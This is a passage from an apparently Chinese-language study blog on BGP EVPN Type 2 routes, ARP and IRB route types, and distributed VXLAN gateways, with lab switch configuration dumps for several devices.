arp   传递 ARP 路由 / MAC 路由</p>\n<p>peer 1.1.1.1 advertise irb    传递 IRB 类型的路由</p>\n<p>默认只传 type3</p>\n<p>MAC route 实现 VM 之间二层互访，需要在 EVPN 邻居之间传递 MAC  route</p>\n<p>MAC route 特征</p>\n<p>携带 RD+MAC + 二层 VNI</p>\n<p>为了支持 ARP 广播抑制和虚拟机热迁移，需要在 EVPN 邻居之间传递 ARP 类型的路由</p>\n<p>传递 IRB peer 1.1.1.1 ad irb</p>\n<p><strong>Type2 路由 ——MAC/IP 路由</strong></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230126212428010.png\" alt=\"image-20230126212428010\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230126212535678.png\" alt=\"image-20230126212535678\"></p>\n<p>arp 路由的特征：携带 RD+MAC+IP + 二层 VNI</p>\n<p>irb 类型的特征：携带 RD+MAC+IP + 二层 VNI + 三层 VNI，irb 类型的路由也具备 arp 类型路由的功能</p>\n<p>什么时候发送 ARP 类型的路由，集中式网关部署时发送 ARP 类型的路由即可</p>\n<p>什么时候发送 IRB 类型的路由，分布式网关一定要发送 IRB 类型的路由</p>\n<p>当邻居之间发布 arp 路由命令后，设备会将用户侧学到主机的 IP+MAC 信息通过 arp 类型的路由发送给 evpn 邻居</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">type 2路由在VXLAN控制平面中的作用包括：</span><br><span class=\"line\"></span><br><span class=\"line\">主机MAC地址通告</span><br><span class=\"line\"></span><br><span class=\"line\">要实现同子网主机的二层互访，两端VTEP需要相互学习主机MAC。作为BGP EVPN对等体的VTEP之间通过交换MAC/IP路由，可以相互通告已经获取到的主机MAC。其中，MAC Address Length和MAC Address字段为主机MAC地址。</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">主机ARP通告</span><br><span class=\"line\"></span><br><span class=\"line\">MAC/IP路由可以同时携带主机MAC地址+主机IP地址，因此该路由可以用来在VTEP之间传递主机ARP表项，实现主机ARP通告。其中，MAC Address和MAC Address Length字段为主机MAC地址，IP Address和IP Address Length字段为主机IP地址。此时的MAC/IP路由也称为ARP类型路由。主机ARP通告主要用于以下两种场景：</span><br><span class=\"line\"></span><br><span class=\"line\">1.ARP广播抑制。当三层网关学习到其子网下的主机ARP时，生成主机信息（包含主机IP地址、主机MAC地址、二层VNI、网关VTEP IP地址），然后通过传递ARP类型路由将主机信息同步到二层网关上。这样当二层网关再收到ARP请求时，先查找是否存在目的IP地址对应的主机信息，如果存在，则直接将ARP请求报文中的广播MAC地址替换为目的单播MAC地址，实现广播变单播，达到ARP广播抑制的目的。</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">2.分布式网关场景下的虚拟机迁移。当一台虚拟机从当前网关迁移到另一个网关下之后，新网关学习到该虚拟机的ARP（一般通过虚拟机发送免费ARP实现），并生成主机信息（包含主机IP地址、主机MAC地址、二层VNI、网关VTEP IP地址），然后通过传递ARP类型路由将主机信息发送给虚拟机的原网关。原网关收到后，感知到虚拟机的位置发生变化，触发ARP探测，当探测不到原位置的虚拟机时，撤销原位置虚拟机的ARP和主机路由。</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230128140404626.png\" alt=\"image-20230128140404626\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[CE1]dis cu </span><br><span class=\"line\">evpn-overlay enable</span><br><span class=\"line\">#</span><br><span class=\"line\">rip 1</span><br><span class=\"line\"> version 2</span><br><span class=\"line\"> network 10.0.0.0</span><br><span class=\"line\"> network 1.0.0.0</span><br><span class=\"line\">#</span><br><span class=\"line\">interface GE1/0/0</span><br><span class=\"line\"> undo portswitch</span><br><span class=\"line\"> undo shutdown</span><br><span class=\"line\"> ip address 10.1.12.1 255.255.255.0</span><br><span class=\"line\">#</span><br><span class=\"line\">interface GE1/0/1</span><br><span class=\"line\"> undo portswitch</span><br><span class=\"line\"> undo shutdown</span><br><span class=\"line\"> ip address 10.1.13.1 255.255.255.0</span><br><span class=\"line\">#</span><br><span class=\"line\">interface GE1/0/2</span><br><span class=\"line\"> undo portswitch</span><br><span class=\"line\"> undo shutdown</span><br><span class=\"line\"> ip address 10.1.14.1 255.255.255.0</span><br><span class=\"line\">#</span><br><span class=\"line\">interface LoopBack0</span><br><span class=\"line\"> ip address 1.1.1.1 255.255.255.255</span><br><span class=\"line\">#</span><br><span class=\"line\">bgp 100</span><br><span class=\"line\"> peer 2.2.2.2 as-number 100</span><br><span class=\"line\"> peer 2.2.2.2 connect-interface LoopBack0</span><br><span class=\"line\"> peer 3.3.3.3 as-number 100</span><br><span class=\"line\"> peer 3.3.3.3 connect-interface LoopBack0</span><br><span class=\"line\"> peer 4.4.4.4 as-number 100</span><br><span class=\"line\"> peer 4.4.4.4 connect-interface LoopBack0</span><br><span class=\"line\"> #</span><br><span class=\"line\"> ipv4-family unicast</span><br><span class=\"line\">  peer 2.2.2.2 enable</span><br><span class=\"line\">  peer 3.3.3.3 enable</span><br><span class=\"line\">  peer 4.4.4.4 enable</span><br><span class=\"line\"> #</span><br><span class=\"line\"> l2vpn-family evpn</span><br><span class=\"line\">  undo policy vpn-target</span><br><span class=\"line\">  peer 2.2.2.2 enable</span><br><span class=\"line\">  peer 2.2.2.2 advertise irb</span><br><span class=\"line\">  peer 2.2.2.2 reflect-client</span><br><span class=\"line\">  peer 3.3.3.3 enable</span><br><span class=\"line\">  peer 3.3.3.3 advertise irb</span><br><span class=\"line\">  peer 3.3.3.3 reflect-client</span><br><span class=\"line\">  peer 4.4.4.4 enable</span><br><span class=\"line\">  peer 4.4.4.4 advertise irb</span><br><span class=\"line\">  peer 4.4.4.4 reflect-client</span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\">[CE2]dis  cu </span><br><span class=\"line\">evpn-overlay enable</span><br><span class=\"line\">#</span><br><span class=\"line\">bridge-domain 10</span><br><span class=\"line\"> vxlan vni 10</span><br><span class=\"line\"> evpn</span><br><span class=\"line\">  route-distinguisher 100:1</span><br><span class=\"line\">  vpn-target 100:1 export-extcommunity</span><br><span class=\"line\">  vpn-target 100:1 import-extcommunity</span><br><span class=\"line\">#</span><br><span class=\"line\">rip 1</span><br><span class=\"line\"> version 2</span><br><span class=\"line\"> network 10.0.0.0</span><br><span class=\"line\"> network 2.0.0.0</span><br><span class=\"line\">#</span><br><span class=\"line\">interface GE1/0/0</span><br><span class=\"line\"> undo shutdown</span><br><span class=\"line\">#</span><br><span class=\"line\">interface GE1/0/0.10 mode l2</span><br><span class=\"line\"> encapsulation dot1q vid 10</span><br><span class=\"line\"> bridge-domain 10</span><br><span class=\"line\">#</span><br><span class=\"line\">interface GE1/0/1</span><br><span class=\"line\"> undo portswitch</span><br><span class=\"line\"> undo shutdown</span><br><span class=\"line\"> ip address 10.1.12.2 255.255.255.0</span><br><span class=\"line\">#</span><br><span class=\"line\">interface LoopBack0</span><br><span class=\"line\"> ip address 2.2.2.2 255.255.255.255</span><br><span class=\"line\">#</span><br><span class=\"line\">interface Nve1</span><br><span class=\"line\"> source 2.2.2.2</span><br><span class=\"line\"> vni 10 head-end peer-list protocol bgp</span><br><span class=\"line\">#</span><br><span class=\"line\">bgp 100</span><br><span class=\"line\"> peer 1.1.1.1 as-number 100</span><br><span class=\"line\"> peer 1.1.1.1 connect-interface LoopBack0</span><br><span class=\"line\"> #</span><br><span class=\"line\"> ipv4-family unicast</span><br><span class=\"line\">  peer 1.1.1.1 enable</span><br><span class=\"line\"> #</span><br><span class=\"line\"> l2vpn-family evpn</span><br><span class=\"line\">  policy vpn-target</span><br><span class=\"line\">  peer 1.1.1.1 enable</span><br><span class=\"line\">  peer 1.1.1.1 advertise irb</span><br></pre></td></tr></table></figure>\n<p>配置分布式网关并且通告 irb 类型路由后‘</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230128150821743.png\" alt=\"image-20230128150821743\"></p>\n<h2 id=\"分布式网关\"><a class=\"markdownIt-Anchor\" href=\"#分布式网关\">#</a> 分布式网关</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CE2-CE3</span><br><span class=\"line\">evpn en\t</span><br><span class=\"line\">bgp 100</span><br><span class=\"line\">peer 3.3.3.3 as 100</span><br><span class=\"line\">peer 3.3.3.3 con l 0</span><br><span class=\"line\">l2vpn evpn</span><br><span class=\"line\">peer 3.3.3.3 enable</span><br><span class=\"line\">peer 3.3.3.3 ad irb</span><br><span class=\"line\"></span><br><span class=\"line\">bd 10</span><br><span class=\"line\">vxxlan 10</span><br><span class=\"line\">evpn </span><br><span class=\"line\">route</span><br><span class=\"line\">vpn-target 100:1</span><br><span class=\"line\"></span><br><span class=\"line\">bbd 20</span><br><span class=\"line\">vpn 100:2</span><br><span class=\"line\"></span><br><span class=\"line\">ip vpn-instance A</span><br><span class=\"line\">route 100:1</span><br><span class=\"line\">vpn- 100:1 both </span><br><span class=\"line\">vpn- 100:1 evpn</span><br><span class=\"line\">vpn 100:2 evpn imp</span><br><span class=\"line\">vxlan vni 99</span><br><span class=\"line\"></span><br><span class=\"line\">int vbdif 10 </span><br><span class=\"line\">ip bind vpn A</span><br><span class=\"line\">ip add </span><br><span class=\"line\">arp dis en</span><br><span class=\"line\">arp coll host en</span><br><span class=\"line\"></span><br><span class=\"line\">int nv 1 </span><br><span class=\"line\">source 2.2.2.2</span><br><span class=\"line\">vni 10 h p p bgp</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>二层 VNI 用于同子网互访</p>\n<p>三层 VNI 用于实现跨子网互访</p>\n<ul>\n<li>\n<p>ARP 类型路由携带的有效信息有：主机 MAC 地址 + 主机 IP 地址 + 二层 VNI；IRB 类型路由携带的有效信息有：主机 MAC 地址 + 主机 IP 地址 + 二层 VNI + 三层 VNI。因此，IRB 类型路由包含着 ARP 类型路由，不仅可以用于主机 IP 路由通告，也能用于主机 ARP 通告。</p>\n</li>\n<li>\n<p>主机 IP 路由通告</p>\n<p>在分布式网关场景中，要实现跨子网主机的三层互访，两端 VTEP（作为三层网关）需要互相学习主机 IP 路由。作为 BGP EVPN 对等体的 VTEP 之间通过交换 MAC/IP 路由，可以相互通告已经获取到的主机 IP 路由。其中，IP Address Length 和 IP Address 字段为主机 IP 路由的目的地址，同时 MPLS Label2 字段必须携带三层 VNI。此时的 MAC/IP 路由也称为 IRB（Integrated Routing and Bridge）类型路由。</p>\n</li>\n</ul>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzEuQkQ=\">1.BD</span> rt 匹配，如果匹配实现广播抑制虚拟机热迁移</p>\n<p>2. 当 Eert 和本端 VPN-instance 中 Eirt 匹配时，会将其中携带的 IP 地址加入到 VPN-instance 路由表中，生成一条主机路由</p>\n<p>export-rt evpn Eert</p>\n<p>import-rt evpn Eirt</p>\n<p>Leaf2 收到 Leaf1 发来的 BGP EVPN 路由后，同时进行如下处理：</p>\n<ul>\n<li>检查该路由携带的 ERT，如果与本端 EVPN 实例的 IRT 相同，则接收该路由。EVPN 实例获取到 IRB 类型路由后，还能提取到其中包含的 ARP 类型路由，用于主机 ARP 通告。</li>\n<li>检查该路由携带的 ERT，如果与本端 L3VPN 实例的 eIRT 相同，则接收该路由。然后，L3VPN 实例获取到该路由携带的 IRB 类型路由，从中提取 Host1 的主机 IP 地址、三层 VNI，在其路由表中保存 Host1 的主机 IP 路由，并根据路由的下一跳迭代出接口，最终迭代结果是指向 Leaf1 的 VXLAN 隧道，如<span class=\"exturl\" data-url=\"bWs6TVNJVFN0b3JlOkQ6JTVDQV8lRTUlQUQlQTYlRTQlQjklQTAlNUMlRTQlQkElQTclRTUlOTMlODElRTYlOTYlODclRTYlQTElQTMlNUNDRTEyODAwLmNobTo6L2RjL2RjX3ZycF9mZWF0dXJlX3Z4bGFuXzEwMzkuaHRtbCNaSC1DTl9DT05DRVBUXzAxNDExMTg4NTBfX2ZpZ19kY192cnBfZmVhdHVyZV92eGxhbl8xMDM5MDc=\">图 6</span> 所示。</li>\n</ul>\n<p>分布式网关只需要维护 rt 匹配的路由</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230130224834603.png\" alt=\"image-20230130224834603\"></p>\n<p>dis ip rou vpn A</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230131144845172.png\" alt=\"image-20230131144845172\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[CE3]di cu </span><br><span class=\"line\">vlan batch 10 20</span><br><span class=\"line\">#</span><br><span class=\"line\">evpn-overlay enable</span><br><span class=\"line\">#</span><br><span class=\"line\">ip vpn-instance A</span><br><span class=\"line\"> ipv4-family</span><br><span class=\"line\">  route-distinguisher 100:4</span><br><span class=\"line\">  vpn-target 100:5 export-extcommunity</span><br><span class=\"line\">  vpn-target 100:22 export-extcommunity evpn</span><br><span class=\"line\">  vpn-target 100:5 import-extcommunity</span><br><span class=\"line\">  vpn-target 100:22 import-extcommunity evpn</span><br><span class=\"line\"> vxlan vni 99</span><br><span class=\"line\">#</span><br><span class=\"line\">bridge-domain 10</span><br><span class=\"line\"> vxlan vni 10</span><br><span class=\"line\"> evpn</span><br><span class=\"line\">  route-distinguisher 100:1</span><br><span class=\"line\">  vpn-target 100:11 export-extcommunity</span><br><span class=\"line\">  vpn-target 100:22 export-extcommunity</span><br><span class=\"line\">  vpn-target 100:11 import-extcommunity</span><br><span class=\"line\">  vpn-target 100:22 import-extcommunity</span><br><span class=\"line\">#</span><br><span class=\"line\">bridge-domain 20</span><br><span class=\"line\"> vxlan vni 20</span><br><span class=\"line\"> evpn</span><br><span class=\"line\">  route-distinguisher 100:2</span><br><span class=\"line\">  vpn-target 100:3 export-extcommunity</span><br><span class=\"line\">  vpn-target 100:22 export-extcommunity</span><br><span class=\"line\">  vpn-target 100:100 export-extcommunity</span><br><span class=\"line\">  vpn-target 100:3 import-extcommunity</span><br><span class=\"line\">  vpn-target 100:22 import-extcommunity</span><br><span class=\"line\">  vpn-target 100:100 import-extcommunity</span><br><span class=\"line\">#</span><br><span class=\"line\">rip 1</span><br><span class=\"line\"> version 2</span><br><span class=\"line\"> network 3.0.0.0</span><br><span class=\"line\"> network 10.0.0.0</span><br><span class=\"line\">#</span><br><span class=\"line\">interface Vbdif10</span><br><span class=\"line\"> ip binding vpn-instance A</span><br><span class=\"line\"> ip address 192.168.1.254 255.255.255.0</span><br><span class=\"line\"> arp distribute-gateway enable</span><br><span class=\"line\"> arp collect host enable</span><br><span class=\"line\">#</span><br><span class=\"line\">interface Vbdif20</span><br><span class=\"line\"> ip binding vpn-instance A</span><br><span class=\"line\"> ip address 192.168.2.254 255.255.255.0</span><br><span class=\"line\"> arp distribute-gateway enable</span><br><span class=\"line\"> arp collect host enable</span><br><span class=\"line\">#</span><br><span class=\"line\">interface GE1/0/1</span><br><span class=\"line\"> undo shutdown</span><br><span class=\"line\">#</span><br><span class=\"line\">interface GE1/0/1.10 mode l2</span><br><span class=\"line\"> encapsulation dot1q vid 10</span><br><span class=\"line\"> bridge-domain 10</span><br><span class=\"line\">#</span><br><span class=\"line\">interface GE1/0/1.20 mode l2</span><br><span class=\"line\"> encapsulation dot1q vid 20</span><br><span class=\"line\"> bridge-domain 20</span><br><span class=\"line\">#</span><br><span class=\"line\">interface GE1/0/6</span><br><span class=\"line\"> undo portswitch</span><br><span class=\"line\"> undo shutdown</span><br><span class=\"line\"> ip address 10.1.13.3 255.255.255.0</span><br><span class=\"line\">#</span><br><span class=\"line\">interface LoopBack0</span><br><span class=\"line\"> ip address 3.3.3.3 255.255.255.255</span><br><span class=\"line\">#</span><br><span class=\"line\">interface Nve1</span><br><span class=\"line\"> source 3.3.3.3</span><br><span class=\"line\"> vni 10 head-end peer-list protocol bgp</span><br><span class=\"line\"> vni 20 head-end peer-list protocol bgp</span><br><span class=\"line\">#</span><br><span class=\"line\">bgp 100</span><br><span class=\"line\"> peer 2.2.2.2 as-number 100</span><br><span class=\"line\"> peer 2.2.2.2 connect-interface LoopBack0</span><br><span class=\"line\"> #</span><br><span class=\"line\"> ipv4-family unicast</span><br><span class=\"line\">  peer 2.2.2.2 enable</span><br><span class=\"line\"> #</span><br><span class=\"line\"> l2vpn-family evpn</span><br><span class=\"line\">  policy vpn-target</span><br><span class=\"line\">  peer 2.2.2.2 enable</span><br><span class=\"line\">  peer 2.2.2.2 advertise irb</span><br><span class=\"line\">  </span><br><span class=\"line\">[CE1]dis cu </span><br><span class=\"line\">evpn-overlay enable</span><br><span class=\"line\">#</span><br><span class=\"line\">rip 1</span><br><span class=\"line\"> version 2</span><br><span class=\"line\"> network 10.0.0.0</span><br><span class=\"line\"> network 1.0.0.0</span><br><span class=\"line\">#</span><br><span class=\"line\">interface GE1/0/3</span><br><span class=\"line\"> undo portswitch</span><br><span class=\"line\"> undo shutdown</span><br><span class=\"line\"> ip address 10.1.13.1 255.255.255.0</span><br><span class=\"line\">#</span><br><span class=\"line\">interface GE1/0/4</span><br><span class=\"line\"> undo portswitch</span><br><span class=\"line\"> undo shutdown</span><br><span class=\"line\"> ip address 10.1.12.1 255.255.255.0</span><br><span class=\"line\">#</span><br><span class=\"line\">interface LoopBack0</span><br><span class=\"line\"> ip address 1.1.1.1 255.255.255.255</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">[CE2]dis cu </span><br><span class=\"line\">vlan batch 10 20</span><br><span class=\"line\">#</span><br><span class=\"line\">evpn-overlay enable</span><br><span class=\"line\">#</span><br><span class=\"line\">ip vpn-instance A</span><br><span class=\"line\"> ipv4-family</span><br><span class=\"line\">  route-distinguisher 100:1</span><br><span class=\"line\">  vpn-target 100:3 export-extcommunity</span><br><span class=\"line\">  vpn-target 100:22 export-extcommunity evpn</span><br><span class=\"line\">  vpn-target 100:3 import-extcommunity</span><br><span class=\"line\">  vpn-target 100:22 import-extcommunity evpn</span><br><span class=\"line\"> vxlan vni 99</span><br><span class=\"line\">#</span><br><span class=\"line\">bridge-domain 10</span><br><span class=\"line\"> vxlan vni 10</span><br><span class=\"line\"> evpn</span><br><span class=\"line\">  route-distinguisher 100:1</span><br><span class=\"line\">  vpn-target 100:100 export-extcommunity</span><br><span class=\"line\">  vpn-target 100:22 export-extcommunity</span><br><span class=\"line\">  vpn-target 100:100 import-extcommunity</span><br><span class=\"line\">#</span><br><span class=\"line\">bridge-domain 20</span><br><span class=\"line\"> vxlan vni 20</span><br><span class=\"line\"> evpn</span><br><span class=\"line\">  route-distinguisher 100:2</span><br><span class=\"line\">  vpn-target 100:100 export-extcommunity</span><br><span class=\"line\">  vpn-target 100:22 export-extcommunity</span><br><span class=\"line\">  vpn-target 100:100 import-extcommunity</span><br><span class=\"line\">  vpn-target 100:22 import-extcommunity</span><br><span class=\"line\">#</span><br><span class=\"line\">rip 1</span><br><span class=\"line\"> version 2</span><br><span class=\"line\"> network 10.0.0.0</span><br><span class=\"line\"> network 2.0.0.0</span><br><span class=\"line\">#</span><br><span class=\"line\">interface Vbdif10</span><br><span class=\"line\"> ip binding vpn-instance A</span><br><span class=\"line\"> ip address 192.168.1.254 255.255.255.0</span><br><span class=\"line\"> arp distribute-gateway enable</span><br><span class=\"line\"> arp collect host enable</span><br><span class=\"line\">#</span><br><span class=\"line\">interface Vbdif20</span><br><span class=\"line\"> ip binding vpn-instance A</span><br><span class=\"line\"> ip address 192.168.2.254 255.255.255.0</span><br><span class=\"line\"> arp distribute-gateway enable</span><br><span class=\"line\"> arp collect host enable</span><br><span class=\"line\">#</span><br><span class=\"line\">interface GE1/0/1</span><br><span class=\"line\"> undo shutdown</span><br><span class=\"line\">#</span><br><span class=\"line\">interface GE1/0/1.10 mode 